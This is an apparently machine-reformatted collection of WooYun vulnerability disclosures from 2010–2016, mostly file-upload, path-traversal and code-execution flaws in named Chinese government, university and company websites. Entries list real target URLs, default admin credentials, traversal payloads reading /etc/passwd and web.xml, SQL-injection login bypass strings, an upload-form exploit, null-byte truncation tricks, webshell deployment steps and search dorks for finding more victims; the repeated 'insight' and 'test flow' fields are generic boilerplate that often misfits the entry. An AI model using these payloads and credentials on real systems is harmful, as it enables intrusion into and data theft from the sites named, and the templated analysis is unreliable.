**修复**: 1. 去除废弃不用的页面；2.验证上传的文件格式；（建议增加服务端java验证而不仅仅是客户端的js验证）3.可能是版本比较杂，有的版本的后台管理多个页面没有权限验证；另外，国家林业局的http://cftv.forestry.gov.cn:8080/cms/frame/login.jsp这里是默认
---

---
### [wooyun-2014-051451] 中国人口与发展研究中心流动人口动态监测管理系统任意文件下载&管理弱口令&上传漏洞
**厂商**: 中国人口与发展研究中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: 后台地址：http://www.ldrk.net.cn/console/index.html账户admin密码admin任意文件下载：http://www.ldrk.net.cn/public/downloadFile.jsp?filePathName=/../public/downloadFile.jsp文章编辑页面存在上传漏洞可以导致直接getshell之前忘记截图了，就不演示上传了！

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0138542] 某大学重点实验室网站任意文件上传
**厂商**: 中北大学 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞地址：http://isdm.nuc.edu.cn/Edit/editor/img.htm#上传xx.aspx.jpg文件，抓包修改文件名为xx.aspx，成功上传：

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 1.对上传目录进行权限限制，禁止非登录状态上传；2.对上传文件进行类型判定，增加后台验证；3，升级编辑器版本。
---

---
### [wooyun-2010-0646] 迅雷系列漏洞-3:上传表单无任何限制,可上传任意文件
**厂商**: 迅雷 | **年份**: 2010 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://125.39.72.61:8080/迅雷某上传页面,可上传任意文件.无需登陆...直接上传....上传成功后会返回文件名称...我就不放文件路径了....省的被搞.

**POC**: http://125.39.72.61:8080/迅雷某上传页面,可上传任意文件.

**绕过**: 直接利用

**修复**: 增加验证机制..限制上传文件类型
---

---
### [wooyun-2013-034652] 河南中烟某系统未授权访问+struts漏洞+数据库root权限泄露大量员工信息
**厂商**: 河南中烟工业有限责任公司 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 河南中烟工业有限责任公司通讯录系统未授权访问，struts任意代码执行漏洞，mysql数据库root权限泄露大量员工联系电话

**POC**: 地址：http://218.28.239.43:8080/main2.jsp无需登录即可访问，大量手机号码泄露struts漏洞，mysql权限为root导致其他数据库泄露，地址：http://218.28.239.43:8080/backstage/LoginAction!adminExit.action

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0129814] 中国研究生人才网存在上传漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: www.91student.com首先用wwwscan扫描了下,发现该网站存在目录遍历,这样给我更好的鼓励然后发现可以注册于是试了试，看看有没有限制上传于是测试上传JSP然而发现没有过滤于是上大马于是用大马上传小马成功了,然后上 菜刀就这样,权限大,危害你们也知道,本人不会提权,所以没去提

**POC**: www.91student.com首先用wwwscan扫描了下,发现该网站存在目录遍历,这样给我更好的鼓励然后发现可以注册于是试了试，看看有没有限制上传于是测试上传JSP然而发现没有过滤于是上大马于是用大马上传小马成功了,然后上 菜刀就这样,权限大,危害你们也知道,本人不会提权,所以没去提

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2014-063646] 某政务服务中心通用型任意文件下载
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 上传功能

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 搜索：http://203.208.46.145/#newwindow=1&q=inurl:web!getItem.action前人经验：WooYun: 某政务服务中心系统通用任意文件上传、任意文件下载、敏感信息遍历西辰软件有限公司 http://www.westarsoft.com/发现的是不同于他的那个文件下载。

**POC**: http://kxspdb.cn/mbox!topagex.action?gotopage=WEB-INF/web.xml&wtvo.pid=WEBTITLE00000034http://dzxz.gov.cn/mbox!topagex.action?gotopage=WEB-INF/web.xml&wtvo.pid=WEBTITLE00000034http://www.jqsxzfwzx.com.cn/mbox!topagex.action?gotopage=WEB-INF/web.xml&wtvo.pid=WEBTITLE00000034

**绕过**: 直接利用

**修复**: 限制路径
---

---
### [wooyun-2013-036890] 杭州开创网络技术有限公司漏洞导致旗下进千客户网站泄露
**厂商**: zjhz.cn | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1，某客户网站后台弱口令   http://jinyuedb.com/admin     admin   1234562，后台任意文件上传       http://jinyuedb.com/admin/sctp.aspx3，密码明文保存

**POC**: 1，客户网站数目：461+2222，明文密码3，安全狗

**绕过**: 直接利用

**修复**: 进千的网站想不出用来干什么逐发布。真心舍不得。另外：为什么我发布的近2/3的漏洞都没人认领就修复了。
---

---
### [wooyun-2010-0292] 迅捷缺陷跟踪系统2007任意文件上传漏洞
**厂商**: 品味科技 | **年份**: 2010 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: com.pingway.bim.base.control.SecurityFilter文件中：if ((uri.indexOf(".jsp") > -1) && (uri.indexOf("Property") < 0) && (uri.indexOf("/Tree/") < 0)) {response.sendRedirect("/System/LoginAction.do?method=logout");return;}上传文件名中包括"Property"即可绕过SecurityFilter

**POC**: 上传的文件放在upload目录下，每个项目一个数字目录，简单穷举即可得到上传的URL

**绕过**: 过滤绕过

**修复**: 上传的文件中过滤掉危险的文件类型，如.jsp/.php等
---

---
### [wooyun-2015-0121463] JEECG开发平台admin密码重置，可影响某执法调度平台
**厂商**: JEECG | **年份**: 2015 | **类型**: 默认配置不当

**元思考**: 触发信号: 参数注入, 认证接口, 上传功能, 后台管理

**洞察**: 默认配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别默认配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 代码在https://github.com/zhangdaiscott/jeecg/blob/02d82286e4dcc58c75711a15487f691c7702f553/src/main/java/org/jeecgframework/web/system/controller/core/LoginController.javaloginController是登陆控制器，有两个参数goPwdInit和pwdInit@RequestMapping(params = "goPwdInit")public String goPwdInit() {return "login/pwd_init";}/*** admin账户密码初始化** @param request* @return*/@RequestMapping(params = "pwdInit")public ModelAndView

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 删除密码初始化部分的代码，重置密码通过邮箱验证
---

---
### [wooyun-2015-0127350]  某省工商行政管理局门户网站可上传恶意文件、获取主机权限
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 参数注入, 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 截图1、首页源码中发现上传api截图2、直接访问该上传api，提示会话失效。截图3、发现该上传api中包含一些参数，尝试将"moduleId=2"改成"moduleId=1"再访问发现可正常访问（说明系统是通过接收用户端所传输过来的moduleid值来判断当前访问是否合法的-设计缺陷啊）

**POC**: 截图1、本地写个上传html，将工商局的上传api填入其中。向服务端上传jspx菜刀马截图2、菜刀连接成功截图3、服务器竟然还支持跨盘符，从c盘users目录下的内容可确定当前用户是administrato权限截图4、成功添加系统管理员admin账户。截图5、由于是内网的机器且是政府的网站，就不做端口反弹了。感觉体现问题危害性的效果已经达到了，希望尽快修复问题啊。

**绕过**: 直接利用

**修复**: 1、过滤jspx文件2、禁用该上传目录的执行权限
---

---
### [wooyun-2016-0168866] 某市中心血站任意文件上传漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2016 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/upload_file.asp?keyno=0&pic=0&tablename=visainfo存在上传点只能上传文本文件，采用00截断进行绕过http://**.**.**.**/20160110.asp上传小马通过小马上传大马http://**.**.**.**/2016wooyun.asp

**POC**: (见原文)

**绕过**: 过滤绕过, 截断攻击

**修复**: 加强输入验证
---

---
### [wooyun-2013-017729] 重庆中小学数字校园管理平台,后台登陆绕过，任意文件上传
**厂商**: cncert国家互联网应急中心 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 重庆中小学数字校园管理平台，藐视是由重庆市教育信息技术与装备中心提供的，重庆环博软件（www.huanbo99.com）开发的藐视整个重庆地区使用的中小学不少，上环博软件看看了案例发现这个系统也是无意之间发现的，http://222.182.201.152:8080直接尝试万能密码：账号：admin' or 'a'='a密码：任意成功登陆2.任意文件上传找了半天，在学生援助这个地方找到了一个上传附件的地方利用burp suite，修改上传文件的后缀，成功上传了asp一句话成功连接一句话

**POC**: 重庆中小学数字校园管理平台，藐视是由重庆市教育信息技术与装备中心提供的，重庆环博软件（www.huanbo99.com）开发的藐视整个重庆地区使用的中小学不少，上环博软件看看了案例发现这个系统也是无意之间发现的，http://222.182.201.152:8080直接尝试万能密码：账号：admin' or 'a'='a密码：任意成功登陆2.任意文件上传找了半天，在学生援助这个地方找到了一个上传附件的地方利用burp suite，修改上传文件的后缀，成功上传了asp一句话成功连接一句话

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-04670] 港中能达快递后台登录页面存在注入，fckeditor编辑器上传漏洞利用
**厂商**: 港中能达快递 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 上传功能, 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 后台登录页面 使用 'or'='or' 直接登录，fckeditor编辑器构造表单上传。之前已经有大黑阔提权，或者脱裤。

**POC**: http://www.nd56.com/fckeditor/editor/filemanager/connectors/aspx/connector.aspx?Command=CreateFolder&Type=Media&CurrentFolder=%2F&NewFolderName=1.asp后台 http://www.nd56.com/e9web-admin/login.htm

**绕过**: 直接利用

**修复**: 过滤，fckeditor该删的删除该改的改。
---

---
### [wooyun-2014-087276] 某旅游网站管理系统SQL注射&任意文件上传
**厂商**: 某旅游网站管理系统 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某旅游网站管理系统SQL注射&任意文件上传。关键字搜索：inurl:way/show.asp?id=第一处漏洞：在/way/show.asp?id=处存在SQL注射。案例如下：http://www.ocanadatravel.com/way/show.asp?id=141http://www.gdyy-travel.com/way/show.asp?id=125http://www.wo-long-gang.com/way/show.asp?id=2http://www.nanjingdongdu.com/way/show.asp?id=97http://www.hs128.com/hs128/way/show.asp?id=44http://www.zgszkh.com/way/show.asp?id=2392http://www.83108310.com/way/show.asp?id

**POC**: 第二处漏洞。存在任意文件上传漏洞，可直接上传ASP，getshell。漏洞上传地址：/htmleditor/file.asp上传后文件路径：/uploadfiles/xx.asp 可通过查看上传后的源代码得知。案例如下：http://www.zgszkh.com//htmleditor/file.asphttp://minibustour.cn//htmleditor/file.asphttp://www.wygk.cn/LY//htmleditor/file.asphttp://www.guolv020.com//htmleditor/file.asphttp://www.letyouyou

**绕过**: 直接利用

**修复**: ........
---

---
### [wooyun-2013-038831] 安徽省某县syWebEditor上传漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2013 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 上传功能

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 青阳县机构编制委员会办公室http://www.ahqybb.gov.cn/syWebEditor/UpImg.asp通过burpsuite截断上传。。

**POC**: (见原文)

**绕过**: 截断攻击

**修复**: 限制访问UpImg.asp页面
---

---
### [wooyun-2014-069222] 店连店某系统漏洞导致获取服务器权限
**厂商**: 店连店 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://oa.dld.com/继续使用以前的exp:<form enctype="multipart/form-data" action="http://oa.dld.com/general/vmeet/wbUpload.php?fileName=test.php+" method="post"><input type="file" name="Filedata" size="50"><br><input type="submit" value="Upload"></form>

**POC**: 一句话地址:http://oa.dld.com//general/vmeet/wbUpload/test.php好像是system权限,因为我可以删system32里面的东西.膜拜大黑阔！！！超级无敌后门删不掉,运维叔叔记得重装备份一下重装系统啊,不然你懂的再送几张在system32里面分析的几个文件吧里面的w3wp.exemicrox.exe还有microsft.exe 和system.exe应该还有

**绕过**: 直接利用

**修复**: 无法直视运维叔叔的技术,一定要重装系统，关键文档备份. 然后用新版的oa系统即可！
---

---
### [wooyun-2014-070521] 宜兴市房产网存在任意文件上传漏洞导致大量信息泄露
**厂商**: 宜兴市房产网 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: PS：正在夜黑风高时只听外面一声响雷裤子都吓尿了！今天正好逛房产网站找房子无意间打开了宜兴市房产网，接着习惯性的问题来了，手一抖注册了个会员进去一看，咦？有头像上传！本来想用BR抓包上传想了想太麻烦干脆直接查看源码各种看各种看最终没有看到任何过滤行为连个基本的验证都没有！难道这就是你的验证？

**POC**: 直接来个JSP文件右键查看图片就尿了好吧菜刀连接PS：渗透内网？NO，淫家是好人不敢继续深入，女朋友说在深入就打你屁屁！（邪恶了）

**绕过**: 直接利用

**修复**: 做过滤做验证，重新装个安全软件，服务器上你装个麦咖啡你吓谁啊？
---

---
### [wooyun-2012-08136] 国务院国有重点企业信息采集系统存在致命安全漏洞
**厂商**: 国务院国资委信息中心 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: Fckeditor编辑器漏洞啊··http://xxcj.sasac.gov.cnhttp://xxcj.sasac.gov.cn/fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/jsp/connector直接上传JSP木马·取得权限

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 修改fckeditor地址
---

---
### [wooyun-2013-023088] 科创CMS uploadImageFile_do.jsp页面文件上传漏洞
**厂商**: chinacreator.com | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 之前把漏洞上报在了cnvd，应cnvd要求把该漏洞上报至wooyun来。

**POC**: 科创CMS上传0day存在位置/creatorcms/comm_front/email/uploadImageFile_do.jsp/comm_front/email/uploadImageFile_do.jsp通过谷歌搜索关键字可以看到相关的政府网站http://www.google.com.hk/search?hl=zh-Hans-HK&source=hp&q=comm_front%2Femail%2F&gbv=2&oq=comm_front%2Femail%2F&gs_l=heirloom-hp.12...15360.15360.0.16453.1.1.0.0.0.0.0.0..0.0.

**绕过**: 直接利用

**修复**: 对上传文件进行服务端验证，只允许上传JPG,GIF,BMP文件，而且大小写全部转换成小写，对0x00，分号冒号等特殊符号进行过滤。
---

---
### [wooyun-2013-036174] 河南省农村信用社联合社--伪大数据入后台之后的那些事
**厂商**: www.hnnx.com | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 上传功能, 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 河南省农村信用社联合社WooYun: 河南省农村信用联社官网(hnnx.com)主站服务器提权漏洞2012-9月 一年了 真快刚提交了一篇  然后突然想到这个 昨天晚上的测试，就有了这一篇我哥在平顶山负责农信网的机房工作 所以我会长关注。昨晚 发现了后台上传漏洞http://www.hnnx.com/sysadmin/FCKeditor/fckeditor.html对  是任意上传，但是 asp asa cer php ashx jspx。。。都不行 要不就是半执行状态，无语。  发现jsp解析，但是：访问时：http://www.hnnx.com//sysadmin/editor/sharefile/image/(20130905010534)X.jsp显然 需要后台验证权限。。然后 就是上一篇：河南省农村信用社联合社--伪大数据入后台   突然想到  登陆后台的情况下在访问 同域传值 

**POC**: http://www.hnnx.com/sysadmin/FCKeditor/fckeditor.html对  是任意上传，但是 asp asa cer php ashx jspx。。。都不行 要不就是半执行状态，无语。  发现jsp解析，但是：访问时：http://www.hnnx.com//sysadmin/editor/sharefile/image/(20130905010534)X.jsp显然 需要后台验证权限。。然后 就是上一篇：河南省农村信用社联合社--伪大数据入后台   突然想到  登陆后台的情况下在访问 同域传值  怎么样呢？完全访问！上图：

**绕过**: 直接利用

**修复**: 会发礼物吗？  呵。。  我哥说省联社的书伟技术不错 我不认识。   本来农信招聘也想考考试试。但是 硬伤：本科、、、%>_<%   唉。。修补：删掉已上传的大小马、 shell 做好系统弱点检测吧。此致。爱上平顶山
---

---
### [wooyun-2013-017140] 南宁某著名网络公司自主开发模板建站cms，通杀无数本土企业客户网站
**厂商**: 南宁典意数码科技有限公司 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 可利用地址：http://www.dianyisheji.com/fckeditor/editor/filemanager/connectors/test.htmlfckeditor上传未经过权限验证，很危险，通杀一切

**POC**: 官方服务器上同时还有上百家用户的网站，均同样的问题官方网站的检测图片：

**绕过**: 直接利用

**修复**: 1、删除危险的上传页面2、做上传页面权限验证3、打补丁，升级程序
---

---
### [wooyun-2012-013937] PHPCMS2008任意PHP代码执行漏洞
**厂商**: phpcms | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: PHPCMS2008系统中string2array函数调用eval有高风险，在/yp/web/include/common.inc.php中$menu变量初始化不严，导致可以注入执行任意PHP代码

**POC**: $r = $db->get_one("SELECT * FROM `".DB_PRE."member_company` WHERE `userid`='$userid'");此处可能查询无结果，导致以下逻辑不执行if($r){extract($r);}结合phpcms的全局变量初始化机制，可以构造$menu变量，结合string2array函数调用eval的漏洞，成功执行任意代码因没找到官方demo，贴张官网案例网站 欧卡二手汽车网 的phpinfo图片

**绕过**: 直接利用

**修复**: 严格初始化、检查任意可能会用到的变量$menu = '';$r = $db->get_one("SELECT * FROM `".DB_PRE."member_company` WHERE `userid`='$userid'");if($r){extract($r);}
---

---
### [wooyun-2015-0110125] 美的官方某分站上传漏洞
**厂商**: midea.com | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 美的官方某分站上传漏洞

**POC**: 美的集团真是什么都做啊，还做小额贷款http://202.104.30.185/http://202.104.30.185/adminfckeditor漏洞，遍历目录http://202.104.30.185/fckeditor//editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=/..fckeditor可直接上传任意格式GETWebshellhttp://202.104.30.185/UserFiles//Image/ind.js

**绕过**: 直接利用

**修复**: 你们懂得
---

---
### [wooyun-2014-072038] 李宁官网被解析html用来做游戏私服
**厂商**: http://www.li-ning.com.cn/ | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 地址http://www.li-ning.com.cn/uploadfile/07029/2014072945099.html这私服也太刁了吧....

**POC**: 哎，快通知官网联系此私服管理追究责任吧...

**绕过**: 直接利用

**修复**: 把这个html页面解析走..
---

---
### [wooyun-2012-011022] 大连大学正方教务系统任意代码执行查询学生信息
**厂商**: 大连大学 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞原理正方教务管理系统是一套基于B/S和C/S全向兼容的管理系统。一般存在B/S架构的页面的IP开放了211端口,即可连接其C/S架构的管理系统,在C/S架构的查询过程中,对发起的TCP回话内容为固定值,可导致为经授权执行SQL查询语句等问题,在SQL查询过程中通过数据库语句可查询到关键账户,通过破解关键账户的密码,获得该教务管理系统的控制权限,随性发挥查询、改成绩什么的、都是浮云。另外求邀请码一个

**POC**: 1.在网上找到的一个教务系统,大连大学的,大连是个好地方啊。2.202.199.155.2:211 是开放的,证明对公网开放的C/S架构的管理方式。使用连接器测试之。提示连接成功,即可执行SQL3.该系统一般都会有一个默认账号,JWC01这个是教务处的账号,权限非常大,可以操作转学，退学什么的。相当的可怕,如果被恶意用户利用,影响也非常严重,对于该系统的密码也是可逆的。4.最终得到jwc01的账号。5.通过该账号可以查询到学生的详细信息,包括身份证号、手机号等。还有家人信息。如果该信息落入到电信诈骗人员手中,将造成很大的社会危害。

**绕过**: 直接利用

**修复**: 既然是白帽子要有安全建议：1.临时解决办法：建议211端口禁止对公网开放,限制在学校内网使用管理系统,禁止对公网开放连接。2.针对C/S架构的软件客户端执行操作语句时需要验证对端的身份。
---

---
### [wooyun-2016-0210602] 海尔集团某服务器配置不当导致代码执行
**厂商**: 海尔集团 | **年份**: 2016 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: # 影响服务器http://forum.acg.haier.net/bbs/robots.txt/a.php# discuz论坛+nginx配置不当http://forum.acg.haier.net/bbs/robots.txt/a.php任意文件解析为php文件执行，即可获取服务器系统权限

**POC**: Windows IP 配置主机名  . . . . . . . . . . . . . : hr_ACG01主 DNS 后缀 . . . . . . . . . . . :节点类型  . . . . . . . . . . . . : 混合IP 路由已启用 . . . . . . . . . . : 否WINS 代理已启用 . . . . . . . . . : 否以太网适配器 Team 1:连接特定的 DNS 后缀 . . . . . . . :描述. . . . . . . . . . . . . . . : BASP Virtual Adapter物理地址. . . . . . . . 

**绕过**: 直接利用

**修复**: 更新nginx配置
---

---
### [wooyun-2015-0134222] 云南移动某业务管理平台存在帐号密码暴力破解+越权查看任意人员帐号信息+任意文件上传漏洞
**厂商**: 中国移动 | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://183.224.74.252/Login.aspx

**POC**: 登录页面可暴力破解，登录页面抓包然后开始爆破，查看数据包长度，成功爆出帐号密码登录业务系统test/test123可查看很多信息可查看任意人员帐号信息点击编辑可查看人员帐号信息，密码还是明文。。。大家好，我是明文！下面说说越权点击人员管理选项抓包得到人员管理页面文件信息可通过抓取到UserManage.aspx页面查看到人员帐号信息，如果在没有进业务系统的情况直接访问http://183.224.74.252/UserManage.aspx会跳转到首页登录界面，所以可绕过验证访问人员管理页面。直接在浏览器上打开http://183.224.74.252/UserManage.aspx抓包查看返

**绕过**: 直接利用

**修复**: 前台登录限制（帐号密码错误数限制），严格限制页面访问，限制文件格式上传
---

---
### [wooyun-2013-034934] 某省地震局文件下载/文件上传
**厂商**: 某省地震局 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.hnea.gov.cn/manage/content/docmanage/download.jsp?filePath=/../../../../../../etc/passwd

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 问题较多，建议整个重新做安全维护.
---

---
### [wooyun-2012-016234] 趣游网解析漏洞，可以修改支付网关为自己的？
**厂商**: 趣游网 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网站找到一处上传的地方，上传一个phpinfo的图片，进行测试。http://www.quyou.comhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/snsinfo/20121219161451_9091.jpg/x.php问题果然存在然后，你懂的。看了一下网站的功能，可以在线支付。里面存在支付网关，是不是可以..

**POC**: 权限很大，服务也很多，不做进一部检测了。

**绕过**: 直接利用

**修复**: 修复上传漏洞，服务器需要配置不允许uplad目录的程序执行。
---

---
### [wooyun-2013-034165] 银川迅雷网络有限公司客户网站通杀0day
**厂商**: 银川迅雷网络有限公司 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 官网:www.ycxl.netUrl:http://www.***.com/admin/upfile.asp?folder=../upload&insert=wj通用Cookie:ASPSESSIONIDAQDBADDQ=CPLIPMADOGIGCLJFFHNGJABP; cmsname=admin; cmsid=1

**POC**: 官网:www.ycxl.netUrl:http://www.***.com/admin/upfile.asp?folder=../upload&insert=wj通用Cookie:ASPSESSIONIDAQDBADDQ=CPLIPMADOGIGCLJFFHNGJABP; cmsname=admin; cmsid=1随便找一个案例  比如:http://www.nzwuye.com/填入提交地址和cookie点击上传 显示成功已成功获取webshell同样填入提交地址和cookie照样获取webshell

**绕过**: 直接利用

**修复**: 不知道
---

---
### [wooyun-2013-019975] DotNetTextBox编辑器洞洞,可上传任意文件
**厂商**: DotNetTextBox | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: 1、用firebug将disabled="disabled'，value="jgp,gif,png"修改为enabled="enabled",value="jpg,gif,png,aspx"，然后点更新成功按钮2、弹出更新成功3、刷新页面，发现此时可允许上传的图片类型，成功新增aspx类型4、找个aspx webshell上传、提示文件上传成功5、上传成功、成功躺在那里6、webshell页面

**绕过**: 直接利用

**修复**: 你们比我专业
---

---
### [wooyun-2014-068566] V5shop某分站会员任意文件上传漏洞
**厂商**: V5shop | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 随便注册个账户上传头像位asp一句话木马。。。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 这还用我说？...
---

---
